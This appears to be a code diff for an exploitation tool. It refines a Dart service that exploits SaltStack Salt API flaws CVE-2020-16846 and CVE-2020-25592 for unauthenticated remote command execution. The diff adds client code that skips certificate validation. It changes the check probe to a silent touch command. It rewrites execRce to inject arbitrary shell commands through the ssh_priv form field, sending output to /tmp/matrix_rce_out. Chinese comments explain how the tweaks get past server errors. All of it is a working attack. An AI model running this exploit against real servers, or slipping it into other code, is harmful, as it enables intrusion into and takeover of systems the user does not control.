@@ -1,6 +1,8 @@
 import 'dart:convert';
+import 'dart:io';
 
 import 'package:http/http.dart' as http;
+import 'package:http/io_client.dart';
 
 import 'exp_result.dart';
 
@@ -294,30 +296,37 @@ class SaltstackExpService {
     this.timeout = const Duration(seconds: 10),
   });
 
+  // Salt API 使用 HTTPS 自签证书，必须跳过证书验证
+  http.Client _client() {
+    final ioClient = HttpClient()
+      ..badCertificateCallback = (_, _, _) => true;
+    return IOClient(ioClient);
+  }
+
   String get _base =>
       baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;
 
   Future<ExpResult> check() async {
+    final client = _client();
     try {
-      const probe = 'echo%20salt_check_54289';
+      // 探针命令必须无 stdout 输出：echo 的输出会被 Salt 当作 SSH key 内容解析，
+      // 导致 500；用 touch 静默写文件，服务端正常返回 200 + {"return":[{}]}。
+      // CVE-2020-25592 允许无 token 调用 SSH 模块；CVE-2020-16846 实现 ssh_priv 注入。
+      final probe = 'touch%20/tmp/salt_matrix_check_${DateTime.now().millisecondsSinceEpoch}';
       final body =
           'token=${Uri.encodeComponent(token)}&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=aaa|$probe%3b';
-      final res = await http
+      final res = await client
           .post(
             Uri.parse('$_base/run'),
             headers: {'Content-Type': 'application/x-www-form-urlencoded'},
             body: body,
           )
           .timeout(timeout);
-      if (res.statusCode == 200 &&
-          (res.body.contains('salt_check_54289') ||
-              res.body.contains('return') ||
-              res.body.contains('jid') ||
-              res.body.contains('minions'))) {
+      if (res.statusCode == 200 && res.body.contains('"return"')) {
         return ExpResult(
           true,
           'CVE-2020-16846',
-          '/run 注入链路可达，响应状态 ${res.statusCode}',
+          'SSH 模块未授权可达且 ssh_priv 注入成功，响应: ${res.body}',
         );
       }
     } catch (_) {}
@@ -325,16 +334,25 @@ class SaltstackExpService {
   }
 
   Future<String?> execRce(String cmd) async {
+    final client = _client();
     try {
+      // stdout 输出不能直接出现在 ssh_priv 注入流中（会被 Salt 当 SSH key 解析 → 500），
+      // 重定向到 /tmp/matrix_rce_out 后静默执行可得到 200。
+      // ssh_priv 值必须整体 encodeComponent，否则 2>&1 里的 & 会被当 form 字段分隔符截断。
+      final sshPrivValue = 'aaa|$cmd>/tmp/matrix_rce_out 2>&1;';
       final body =
-          'token=${Uri.encodeComponent(token)}&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=aaa|${Uri.encodeComponent(cmd)};';
-      final res = await http
+          'token=${Uri.encodeComponent(token)}&client=ssh&tgt=*&fun=a&roster=whip1ash'
+          '&ssh_priv=${Uri.encodeComponent(sshPrivValue)}';
+      final res = await client
           .post(
             Uri.parse('$_base/run'),
             headers: {'Content-Type': 'application/x-www-form-urlencoded'},
             body: body,
           )
           .timeout(timeout);
+      if (res.statusCode == 200) {
+        return '[盲注 RCE] 命令已执行，输出已写入目标 /tmp/matrix_rce_out\n服务端响应: ${res.body}';
+      }
       return res.body.isNotEmpty ? res.body : null;
     } catch (_) {
       return null;
